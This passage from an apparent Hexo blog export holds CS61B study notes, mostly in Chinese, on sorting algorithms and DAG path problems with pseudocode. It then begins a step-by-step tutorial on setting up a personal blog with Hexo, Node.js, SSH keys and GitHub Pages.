class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Visit vertices in topological order.</span><br><span class="line">On each visit, relax all outgoing edges.</span><br><span class="line">   <span class="comment">// 上一步是都要relax，而不是marked这样</span></span><br><span class="line">   <span class="comment">// 始终按照topological走而不是min的，与dijsktra不一样</span></span><br><span class="line">   <span class="comment">// 设置当前最短的边为prenode</span></span><br></pre></td></tr></table></figure></li></ol></li></ol></li><li><p>LPT: longest path without cycle</p><ol><li>对于普遍的无环图: unsolved O(n!)</li><li>对于DAGs: O(V+E) runtime – SPT算法加上-号</li></ol></li><li><p>Reduction</p><ol><li>DAG-LPT reduces to DAG-SPT</li></ol></li><li><p>Decomposition: 分解为子问题</p></li></ol><h2 id="7-Sorting"><a href="#7-Sorting" class="headerlink" title="7. Sorting"></a>7. Sorting</h2><h3 id="7-1-Basic-Sorts"><a href="#7-1-Basic-Sorts" class="headerlink" title="7. 1 Basic Sorts"></a>7. 1 Basic Sorts</h3><ol><li><p>排序的作用</p><ol><li>二分查找</li><li>重复匹配</li><li>与balanced data structure进行变换</li></ol></li><li><p>Notes</p><ol><li>自定义比较(与.equals()不同)：Ordering relations are typically given in the form of compareTo or compare methods. – Comparator&lt;T&gt; 或者 Comparable&lt;T&gt;</li><li>转位(inversion)</li></ol></li><li><p><em><strong>First: Selection Sort</strong></em></p><ol><li>runtime: theta(n^2)</li><li>idea: every time find smallest item</li></ol></li><li><p><em><strong>Second: Heap Sort</strong></em></p><ol><li><p>Idea: using max-oriented heap</p><ol><li>不是最小堆 – 因为数组开头被占据了如果in place的话</li><li>min-heap也可以，但是会比较复杂一点</li></ol></li><li><p>runtime: O(nlogn), space takes O(n) &gt; O(1) but can make it in place, best time is theta(n)</p><ol><li>Extra for experts, show that bottom-up heapification is Θ(N) in the worst case.</li><li>More extra for experts, show heapsort is Θ(N log N) in the worst case.</li></ol></li><li><p>persudocode</p><ol><li>in-place heap sort:是通过反向确定最小堆来实现的<a href="https://docs.google.com/presentation/d/1SzcQC48OB9agStD0dFRgccU-tyjD6m3esrSC-GLxmNc/edit#slide=id.g12a2a1b52f_0_409">showcase</a></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. naive heap sort not in  place</span></span><br><span class="line">Insert all items into a max heap, and discard input array.</span><br><span class="line">Create output array.</span><br><span class="line">Repeat N times:</span><br><span class="line">   Delete largest item from the max heap.</span><br><span class="line">   Put largest item at the end of the unused part of the output array.</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. in-place heap sort</span></span><br><span class="line">Bottom-up heapify input array:</span><br><span class="line">   Sink nodes in reverse level order: sink(k)</span><br><span class="line">   <span class="comment">// in reverse order</span></span><br><span class="line">Repeat N times:</span><br><span class="line">   Delete largest item from the max heap, swapping root with last item in the heap.</span><br><span class="line">   <span class="comment">// for heap is in the front</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p><em><strong>Third: Merge Sort</strong></em></p><ol><li><p>runtime: theta(nlogn), space theta(n)</p></li><li><p>In-place? – also possible to do in-place merge sort, but algorithm is very complicated, and runtime performance suffers by a significant constant factor.</p></li><li><p><a href="https://docs.google.com/presentation/d/1h-gS13kKWSKd_5gt2FPXLYigFY4jf5rBkNFl3qZzRRw/pub?start=false&loop=false&delayms=3000#slide=id.g12a3009c32_0_325">showcase</a></p></li><li><p>persudocode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Split items into <span class="number">2</span> roughly even pieces -- until size == <span class="number">1</span></span><br><span class="line">Mergesort each <span class="title function_">half</span> <span class="params">(steps not shown, <span class="built_in">this</span> is a recursive algorithm!)</span></span><br><span class="line">Merge the two sorted halves to form the <span class="keyword">final</span> result.</span><br></pre></td></tr></table></figure></li></ol></li><li><p><em><strong>Four: Insertion Sort</strong></em></p><ol><li><p>runtime and visualizing</p><ol><li>best Omega(n), worst o(n^2), 使用三角形来可视化，倒置(小到大)的话三角形满了</li></ol></li><li><p>persudocode</p><ol><li><a href="https://docs.google.com/presentation/d/10b9aRqpGJu8pUk8OpfqUIEEm8ou-zmmC7b_BE5wgNg0/edit#slide=id.g12a2f94aac_0_127">in-place showcase</a></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// naive approach: build output</span></span><br><span class="line">Starting with an empty output sequence.</span><br><span class="line">Add each item from input, inserting into output at right point.</span><br><span class="line"></span><br><span class="line"><span class="comment">// in-place insertion sort</span></span><br><span class="line">Repeat <span class="type">for</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span> to N - <span class="number">1</span>:</span><br><span class="line">Designate item i as the traveling item.</span><br><span class="line">Swap item forward until traveller is in the right place among all previously examined items</span><br><span class="line">   <span class="comment">// 实际中使用i,j“双指针”</span></span><br><span class="line">   <span class="comment">// 算法的正确性 -- i所过的地方都是已经排序的</span></span><br><span class="line">   <span class="comment">// 时间复杂度是一样的</span></span><br></pre></td></tr></table></figure></li><li><p>more about insertion sort</p></li></ol></li><li><p><em><strong>Added: Shell Sort</strong></em></p><ol><li>Key Idea<ol><li>Instead of comparing adjacent items, compare items that are one stride length h apart.</li><li>Start with large stride, and decrease towards 1.</li><li>Example: h &#x3D; 7, 3, 1.</li></ol></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_shellsort.png" alt="shell sort showcase"><ol><li>By using large strides first, fixes most of the inversions.</li><li>We used 7, 3, 1. Can generalize to 2k - 1 from some k down to 1.</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_differentShellsort.png" alt="different shell sort"></li></ol></li></ol></li><li><p>which sort should i use?</p><ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_basicRuntime.png" alt="Sort_basicRuntime"><ol><li>heap sort跨越大地方去找在系统上叫做caching</li></ol></li><li>almost sorted array: 绝对是 insertion sort – merge还是会需要很多合并(相当于重复操作了)，heap拿出最大需要nlogn</li><li>One exchange per inversion (and number of comparisons is similar). Runtime is Θ(N + K) where K is number of inversions – 多少逆序就需要逆几次</li><li>Define an almost sorted array as one in which number of inversions ≤ cN for some c. Insertion sort is excellent on these arrays.</li><li>For small arrays (N &lt; 15 or so), insertion sort is fastest</li></ol></li></ol><h3 id="7-2-Quick-Sorts"><a href="#7-2-Quick-Sorts" class="headerlink" title="7. 2 Quick Sorts"></a>7. 2 Quick Sorts</h3><ol><li><p>Key Idea: Partitioning(分区)</p><ol><li><p>在元素 x&#x3D;a[i] 上分割数组 a[]，就是重新排列 a[]，使得</p><ol><li>x 移动到位置 j（可能与 i 相同）</li><li>x 左边的所有条目 &lt;&#x3D; x，x 右边的所有条目 &gt;&#x3D; x</li></ol></li><li><p>如何进行分区？ – 子问题</p><ol><li>Simplest (but not fastest) Answer: 3 Scan Approach – 扫描三次，每次只关注一件事</li><li>also: 扫描一次，小的放最左，大的放最右</li></ol></li><li><p>persudocode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Partition on leftmost item. </span><br><span class="line">Quicksort left half.</span><br><span class="line">Quicksort right half.</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Runtime: best theta(nlogn), worst theta(n^2), average theta(nlogn) empirically; space: theta(n) using recursion</p><ol><li>For most common situations, it is empirically the fastest sort – pivot matters</li><li>理解：与merge sort无需再每一层都进行复制，只需要移动某一个即可，merge sort合并时还要进行比较按照顺序</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_quickaverage.png" alt="quicksort average"></li></ol></li><li><p>Quick is BST inorder sort, all about partitioning</p><ol><li>Random insertion into a BST takes O(N log N) time，平均也是O(nlogn)</li><li>也有其他的树排序，但是不如binary search tree优雅</li></ol></li></ol><h3 id="7-3-More-Quick-Sort-Comparision-Based-Sorting-Summary"><a href="#7-3-More-Quick-Sort-Comparision-Based-Sorting-Summary" class="headerlink" title="7. 3  More Quick Sort, (Comparision Based) Sorting Summary"></a>7. 3  More Quick Sort, (Comparision Based) Sorting Summary</h3><ol><li><em><strong>Avoid Worst Case</strong></em><ol><li>举例如下<ol><li>Bad ordering: Array already in sorted order (or almost sorted order).</li><li>Bad elements: Array with all duplicates – tricky</li></ol></li><li>思维<ol><li>Randomness: Pick a random pivot or shuffle before sorting<ol><li>可以攻破：The resulting Quicksort has a family of dangerous inputs that an adversary could easily generate</li></ol></li><li>Smarter pivot selection: Calculate or approximate the median<ol><li>安全但是不高效：Could calculate the actual median in linear time. “Exact median Quicksort” is safe: Worst case Θ(N log N), but it is slower than Mergesort.</li></ol></li><li>Introspection: Switch to a safer sort if recursion goes to deep</li></ol></li><li>对于第二各想法 – 中位数：find the median in Θ(N) time?<ol><li>BFPRT – Quicksort using PICK to find the exact median (Quicksort PickTH) is terrible! Cost to compute medians is too high.</li><li>another one median identification algorithm: Quick Select – using partitioning<ol><li>只考虑对它有用的部分，N+N&#x2F;2+N&#x2F;4+…+1&#x3D;theta(n)</li><li>使用这个来quick sort也很慢</li></ol></li></ol></li><li>随机Randomness挺好的</li></ol></li><li>Tony Hoare’s In-place Partitioning Scheme<ol><li><p><a href="https://docs.google.com/presentation/d/1DOnWS59PJOa-LaBfttPRseIpwLGefZkn450TMSSUiQY/">showcase</a></p></li><li><p>persudocode发明者的实现: L, G两个指针，如果cross，说明左都小，右都大，此时可以将pivot与G互换(如果pivot是第一个，与他换的必须是小的，如果选的不是最左边的，与最左变换reduces)</p><ol><li>为什么要在&#x3D;&#x3D;处停？可以避免全部相等时的O(n^2)???</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Left pointer loves small items.</span><br><span class="line">Right pointer loves large items.</span><br><span class="line">Big idea: Walk towards each other, swapping anything they don’t like.</span><br><span class="line">   when meet hated items, stop. when the two all stop, exchange</span><br><span class="line">   <span class="comment">// End result is that</span></span><br><span class="line">   <span class="comment">// things on left are “small”</span></span><br><span class="line">   <span class="comment">// things on the right are “large”.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 详细版本</span></span><br><span class="line"><span class="number">1.</span> Create L and G pointers at left and right ends.</span><br><span class="line">   <span class="number">1.</span> L pointer is a friend to small items, and hates large or equal items.</span><br><span class="line">   <span class="number">2.</span> G pointer is a friend to large items, and hates small or equal items.</span><br><span class="line"><span class="number">2.</span> Walk pointers towards each other, stopping on a hated item.</span><br><span class="line">   <span class="number">1.</span> When both pointers have stopped, swap and move pointers by one.</span><br><span class="line">   <span class="number">2.</span> When pointers cross, you are done walking.</span><br><span class="line"><span class="number">3.</span> Swap pivot with G.</span><br></pre></td></tr></table></figure></li><li><p><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_quickRuntime.png" alt="runtime"></p></li></ol></li><li>java中的quick sort不好的输入会导致程序的崩溃 – 为什么不在递归过深时中断呢?不知道java他们怎么想</li><li>Stability, Adaptiveness, Optimization<ol><li>是否stable – Equivalent items 的顺序是否会改变<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_stable.png" alt="stable?"><ol><li>举例：insertion sort就是stable的，因为不会改变一样的次序</li><li>Quick Sort其实也可以是，(分区策略)但是会比较慢</li></ol></li><li>Optimzation Skills<ol><li>switch to insertion sort: When a subproblem reaches size 15 or lower, use insertion sort.</li><li>Make sort adaptive: Exploit existing order in array (Insertion Sort, SmoothSort, TimSort (the sort in Python and Java)).</li><li>Exploit restrictions on set of keys. If number of keys is some constant, e.g. [3, 4, 1, 2, 4, 3, …, 2, 2, 2, 1, 4, 3, 2, 3], can sort faster (see 3-way quicksort – if you’re curious, see:  <a href="http://goo.gl/4sYnv3">荷兰旗问题</a>)</li><li>For Quicksort: Make the algorithm introspective, switching to a different sorting method if recursion goes too deep. Only a problem for deterministic flavors of Quicksort.</li></ol></li></ol></li></ol><h3 id="7-4-Sorting-and-Algorithmic-Bounds"><a href="#7-4-Sorting-and-Algorithmic-Bounds" class="headerlink" title="7. 4 Sorting and Algorithmic Bounds"></a>7. 4 Sorting and Algorithmic Bounds</h3><ol><li>Core Idea: Problem provide a lower bound for solution – outer set is the lower bound</li><li>Math<ol><li>N! ∈ Ω((N&#x2F;2)^(N&#x2F;2))<ol><li>equals to: factorial grow at least as quickly as (N&#x2F;2)^(N&#x2F;2)</li><li>可以举例来论证，不要求严格证明</li></ol></li><li>推论1: log(N!) ∈ Ω(NlogN): 取对数就好了</li><li>N log N ∈ Ω(log(N!))<ol><li>拆开来即可</li></ol></li><li>Conclusion: N log N ∈ Θ(log N!), log N! ∈ Θ(N log N) –&gt; N log N &#x3D; log(N!)</li></ol></li><li>Theoretical Bounds on Sorting<ol><li>初步推理: Worst case asymptotic runtime of TUCS is between Θ(N) and Θ(N log N).</li><li>跳脱一下思维： Puppy, Cat, Dog Problem<ol><li>决策树，最多有N!个可能性，树最矮为log(N!)与Nlog(N)渐进Puppy, Cat, Dog</li><li>Puppy, Cat, Dog 问题为 Omega(NlogN)</li><li>提一嘴: Finding an optimal decision tree for the generalized version of puppy, cat, dog (e.g. N&#x3D;6: puppy, cat, dog, monkey, walrus, elephant) is an open problem in mathematics.</li></ol></li><li>回来了: Puppy, Cat, Dog Problem reduces to Sorting – Thus, any lower bound on difficulty of puppy, cat, dog must ALSO apply to sorting.</li></ol></li></ol><h3 id="7-5-Radix-Sorts"><a href="#7-5-Radix-Sorts" class="headerlink" title="7. 5 Radix Sorts"></a>7. 5 Radix Sorts</h3><ol><li>引入一个怪异的sort – “Sleeping Sort” for integer, runtime N+Max(A)</li><li>Counting Sort<ol><li>初始想法(only for integer as key): Exploiting Space Instead of Time, key value -&gt; index</li><li>Generlizing – Alphabet case: Keys belong to a finite ordered alphabet<ol><li><a href="https://docs.google.com/presentation/d/1vmVKHRSwb5WN1rHvktplbPGecHChxOwWa7ovRuiLzbA/">steps</a>: appearance counts -&gt; starting index -&gt; copying</li><li>Runtime: Total runtime on N keys with alphabet of size R: Θ(N+R)</li></ol></li><li>Which is faster? Counting Sort or Quick Sort<ol><li>For sufficiently large collections, counting sort will simply be faster</li><li>alphabet也很重要</li></ol></li></ol></li><li>Radix Sort: Extension of Counting Sort 解决有限字母表的无限排列问题<ol><li>LSD(least significant digit) Radix Sort – Stable<ol><li>Idea: 从最右边开始对每一个位进行逐一排序</li><li><a href="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_LSDshowcase.png">Showcase</a></li><li>Runtime: Θ(WN+WR)<ol><li>N: Number of items</li><li>R: size of alphabet</li><li>W: Width of each item in # digitsa</li><li>具有长版效应</li></ol></li></ol></li><li>MSD(most significant digit) Radix Sort<ol><li>Idea: 从最左边，but这里需要使用子问题来解决，否则低位的优先级”会高于”高位导致排序出错</li><li>Runtime: Best theta(N+R), Worst(WN+WR)</li></ol></li><li>Merge Sort on strings of length W<ol><li>Θ(N log N) if each comparison takes constant time – 字符串都不同</li><li>Θ(WN log N) if each comparison takes Θ(W) time – 字符串都相同</li></ol></li><li>Which is Better?<ol><li>When might LSD sort be faster<ol><li>Sufficiently large N.</li><li>If strings are very similar to each other.</li><li>Each Merge Sort comparison costs Θ(W) time.</li></ol></li><li>When might Merge Sort be faster?<ol><li>If strings are highly dissimilar from each other. – 此时LSD中很多比较其实是浪费</li><li>Each Merge Sort comparison is very fast.</li></ol></li></ol></li></ol></li><li>LSD Radix Sort on Integer<ol><li>方法：Could convert into a String and treat as a base 10 number</li><li>可以考虑不同进制 – Runtime depends on the alphabet size<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_LSDbase.png" alt="showcase"></li><li>为什么不同base间比较速率不同: 与数据的分布有关，并且比较是按照digit进行比较的</li></ol></li></ol></li></ol><h3 id="7-6-Sorting-and-Data-Structures-Conclusion"><a href="#7-6-Sorting-and-Data-Structures-Conclusion" class="headerlink" title="7. 6 Sorting and Data Structures Conclusion"></a>7. 6 Sorting and Data Structures Conclusion</h3><ol><li>Things we should know when analysing<ol><li>Just-In-Time Compiler secretly optimizes your code when it runs</li><li>perform computational experiments makes things better</li><li>There’s always the chance that some small optimization to an algorithm can make it significantly faster.</li><li>主要动作是比较，但是其他动作有时也要进行考虑</li><li>混合思想<ol><li>If an object has both digits AND is comparable, could we somehow use an LLRB to improve radix sort in some way?</li><li>java中的hashmap对于可以comparable的对象存储在红黑树中</li></ol></li></ol></li><li>Three basic flavors: Comparison, Alphabet, and Radix based!<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Sort_Summary.png" alt="total summary"></li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/DS_and_Sorting.png" alt="Ds"></li></ol></li></ol><h3 id="7-7-Sorting-Implementation-Extra-in-“Sorting-and-Algorithmic-Bounds”-ppt"><a href="#7-7-Sorting-Implementation-Extra-in-“Sorting-and-Algorithmic-Bounds”-ppt" class="headerlink" title="7. 7 Sorting Implementation (Extra in “Sorting and Algorithmic Bounds” ppt)"></a>7. 7 Sorting Implementation (Extra in “Sorting and Algorithmic Bounds” ppt)</h3><ol><li>没有quick sort，可以看看</li></ol><h2 id="8-Extra-Topic-SoftWare-Engineering"><a href="#8-Extra-Topic-SoftWare-Engineering" class="headerlink" title="8. Extra Topic: SoftWare Engineering"></a>8. Extra Topic: SoftWare Engineering</h2><blockquote><p>这一部分看着没啥意思，看着玩，还是要自己动手啊</p></blockquote><h3 id="8-1-SE-I-Complexity"><a href="#8-1-SE-I-Complexity" class="headerlink" title="8. 1 SE I: Complexity"></a>8. 1 SE I: Complexity</h3><ol><li>Complexity(复杂程度)<ol><li>表现形式<ol><li>变化放大： 一个简单更改需要在许多地方进行修改</li><li>认知负荷： 进行修改需要了解多少知识</li><li>未知数： 最糟糕的复杂性类型</li></ol></li><li>Pholosiphy<ol><li>0容忍 – 防止堆积</li><li>Strategic Programming(全局意识) – 但是实时应变，系统无法一开始就完美设计</li><li>可读性<ol><li>不添加过多特殊情况 – if&#x2F;else</li><li>重要信息与依赖管理</li><li>Compiler will optimize</li><li>Encapsulate 封装</li></ol></li></ol></li></ol></li></ol><h3 id="8-2-SE-II-Modular"><a href="#8-2-SE-II-Modular" class="headerlink" title="8. 2 SE II: Modular"></a>8. 2 SE II: Modular</h3><ol><li>看过但是没记下来，印象中没有什么重要的东西</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cs大件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo和github搭建个人独立博客</title>
      <link href="/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置工具-环境"><a href="#1-前置工具-环境" class="headerlink" title="1. 前置工具&amp;&amp;环境"></a>1. 前置工具&amp;&amp;环境</h2><ol><li>github</li><li>Node.js</li><li>hexo</li><li>git</li></ol><h2 id="2-下载node-js和git"><a href="#2-下载node-js和git" class="headerlink" title="2. 下载node.js和git"></a>2. 下载node.js和git</h2><ol><li><a href="https://git-scm.com/">Git官网</a><ol><li>点击download下载即可，一路next没啥问题<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z1.png" alt="Git Download"></li></ol></li><li><a href="https://nodejs.cn/">node.js官网</a><ol><li>Hexo是基于 Node.js 驱动的一款博客框架</li><li>也是直接点击download即可<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z2.png" alt="node.js Download"></li></ol></li><li>以上两个下载完成后再cmd控制台中输入以下，有出现版本号即可<ol><li>node -v</li><li>npm -v</li><li>git -v<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z3.png" alt="CMD显示"></li></ol></li></ol><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><ol><li>在自己的目录中新建一个文件夹来存放你的博客文章<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A24.png" alt="hexo目录建立"></li><li>进入文件夹中，右键选择”显示更多选项”，点击git bash<ol><li>跟换淘宝源(下载更快一点)，使用命令行<code>npm install -g cnpm --registry=https:\//registry.npm.taobao.org</code><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A25.png" alt="淘宝源"></li><li>下载hexo，使用命令<code>cnpm install -g hexo-cli</code></li><li>进行初始化，使用命令<code>hexo init</code>，并且文件夹中多出一堆文章(发现自己少了什么也没事，下图是写博客时照的，init成功一般就好了)<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A26.png" alt="hexo init"><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A27.png" alt="hexo init"></li><li>在git bash中输入<code>hexo s</code>或者<code>hexo server</code>(二者一样)，有hello world界面就好了(这个界面是自带的)，出现这个界面也就成功了，hexo安装正常完毕<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A28.png" alt="hexo s"></li></ol></li></ol><h2 id="4-注册github并创建库"><a href="#4-注册github并创建库" class="headerlink" title="4. 注册github并创建库"></a>4. 注册github并创建库</h2><ol><li><a href="https://github.com/">github网站</a><ol><li>需要魔法(可以直接用steam++加速github单个，现在改名叫<a href="https://steampp.net/">Watt Tookie</a>)</li><li>如果是未使用过的用户需要先注册，<em><strong>sign up</strong></em>按要求走就可以了</li><li>注册之后邮箱会收到一封Github的邮件，点击Github的链接确认注册即可<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A29.png" alt="注册图片"></li></ol></li><li>注册完毕后，创建一个仓库<ol><li>点击右上角个人头像，点击其中的Your repositories<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A210.png" alt="创建仓库"></li><li>点击右上角绿色的new按钮，输入仓库名，选择public类型，其他不用去改动它<ol><li>注意此处的仓库名一定要是<em><strong>用户名.github.io</strong></em>，否则会打不开网页<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A211.png" alt="初始化仓库"></li></ol></li><li>复制下ssh，下面要用<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A212.png" alt="ssh"></li></ol></li></ol><h2 id="5-设置ssh密钥"><a href="#5-设置ssh密钥" class="headerlink" title="5. 设置ssh密钥"></a>5. 设置ssh密钥</h2><ol><li>首先生成ssh公钥<ol><li>在git bash下输入<code>cd ~/.ssh</code>进入ssh文件</li><li>在git bash中的ssh文件中输入命令<code>ssh-keygen -t rsa -C 注册时的邮箱地址</code></li></ol></li><li>配置ssh到github中<ol><li>在我的电脑中打开<em><strong>C盘</strong></em>找到 <em><strong>用户</strong></em>，进入发现有一个.ssh的文件夹</li><li>点击进去看见<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A213.png" alt="ssh"></li><li>接下来要点开<em><strong>id_rsa.pub文件，不能是id_rsa文件</strong></em>(如果点击会改变，需要重开)，<em><strong>从头到尾复制下来</strong></em>(ssh-rsa 也要)</li><li>回到github同样点击右上角头像，找到setting按键, 将刚刚在.ssh目录下所复制的id_rsa.put文件中的信息复制进key,名字的话随便取都可以<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A214.png" alt="ssh"><br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A215.png" alt="ssh"></li><li>验证是否添加成功，输入命令<code>ssh -T git@github.com</code>并且输入yes之后，行末尾会显示你的用户名，同时会有邮箱提醒</li></ol></li><li>最后对本地的git进行全局配置<ol><li>输入命令：<code>git config --global user.name &quot;注册时用户名&quot;</code></li><li>输入命令：<code>git config --global user.email &quot;注册时邮箱&quot;</code></li></ol></li></ol><h2 id="6-撰写文章并发布"><a href="#6-撰写文章并发布" class="headerlink" title="6. 撰写文章并发布"></a>6. 撰写文章并发布</h2><ol><li><p>先打开目录下的_config.yml文件</p><ol><li><p>ctrl+f搜索关键字deploy</p></li><li><p>将deploy部分替换为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">   type: git  </span><br><span class="line">   repo: git@github.com:用户名/用户名.github.io.git    #这个是使用ssh的格式，注释可以不用加入</span><br><span class="line">   branch: main</span><br></pre></td></tr></table></figure></li></ol></li><li><p>需要安装上传工具</p><ol><li>在gitbash中输入命令 <em><strong>cnpm install hexo-deployer-git</strong></em></li><li>需要在文件的根目录下运行命令</li></ol></li><li><p>在hexo中创建文章(md格式)</p><ol><li>在hexo中写博客是要浅学以下markdown的喔，一天基本就能学会了</li><li>写markdown的文章我是直接使用vscode，网上教程看一下就好</li><li>使用hexo new命令创建新文章<ol><li>在哪里使用该命令都可以，会自动在soure中的_posts文件夹下产生md文件(也可以直接_posts文件夹中右键创建)<br>  <img 